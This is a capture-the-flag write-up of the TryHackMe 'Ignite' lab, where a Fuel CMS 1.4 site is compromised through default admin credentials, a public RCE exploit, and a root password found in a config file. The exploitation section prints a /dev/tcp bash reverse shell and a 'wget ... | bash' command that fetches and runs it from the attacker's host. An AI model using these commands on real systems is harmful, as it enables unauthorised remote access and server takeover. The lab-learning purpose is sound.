# TryHackMe - Ignite (Write-Up)

_3 min read · April 28, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Ignite**](https://tryhackme.com/room/ignite) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: DarkStar7471

---

## Scanning for Open Ports

Machine IP: 10.48.187.122.

As usual, I started with an [**Nmap**](https://www.kali.org/tools/nmap/) scan:

```bash
nmap -T4 -p- 10.48.187.122
sudo nmap -sCV -p 80 10.48.187.122
```

![Nmap Output](./img/thm-ignite/Nmap-output.png)

From the scan result, I noticed that:

- HTTP (port 80) is open and `robots.txt` is available.

I then browsed the site.

![Ignite: Website](./img/thm-ignite/web.png)

I saw it uses **Fuel CMS version 1.4**.

I then checked `robots.txt`:

```output
User-agent: *
Disallow: /fuel/
```

I navigated to `/fuel`:

![Ignite: Website /fuel](./img/thm-ignite/web-login.png)

It turned out to be the Fuel CMS login page.

---

## Exploitation

I tried logging in using `admin:admin` and fortunately it worked :D.

In the dashboard, I saw several places where I could upload a file. However, I got an error when trying to upload a reverse shell.

Since I already knew the CMS and its version, I searched online for known vulnerabilities.

I found [Fuel CMS 1.4.1 - Remote Code Execution (3)](https://www.exploit-db.com/exploits/50477) on Exploit DB.

I then downloaded the exploit and ran it.

```bash
python3 rce -u http://10.48.187.122/
```

![RCE](./img/thm-ignite/rce.png)

It worked!

I initially tried to catch a reverse shell directly with [**netcat**](https://www.kali.org/tools/netcat/), but it did not work.

However, this method worked instead:

First, I created a `rev.sh` file:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.223.226/4418 0>&1
```

Then I started a Python HTTP server:

```bash
python3 -m http.server 8000
```

Next, I set up my netcat listener:

```bash
nc -lvp 4418
```

Finally, through the RCE console, I executed:

```bash
wget -O- http://192.168.223.226:8000/rev.sh | bash
```

![Rev Shell](./img/thm-ignite/rev-shell.png)

I successfully gained a reverse shell as `www-data`.

---

## Post-Exploitation & Privilege Escalation

I navigated to `/home` and saw that `www-data` was a user.

And just like that, I retrieved the **user flag**.

![User Flag](./img/thm-ignite/user-flag.png)

After doing some of my privesc checklists and failed, I returned to the web directory to look for config files.

I found `/database.php` in `/fuel/application/config` directory.

![database.php](./img/thm-ignite/db-creds.png)

The file contained credentials, including the root password.

I then switched to root and retrieved the **root flag**.

```bash
su root
mememe
cd /root
cat root.txt
```

![Root Flag](./img/thm-ignite/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- identify default credentials on a CMS login page
- exploit a known Fuel CMS vulnerability for RCE
- gain a reverse shell by hosting and executing a payload
- search configuration files for sensitive credentials

Thank you for reading and see you next time!
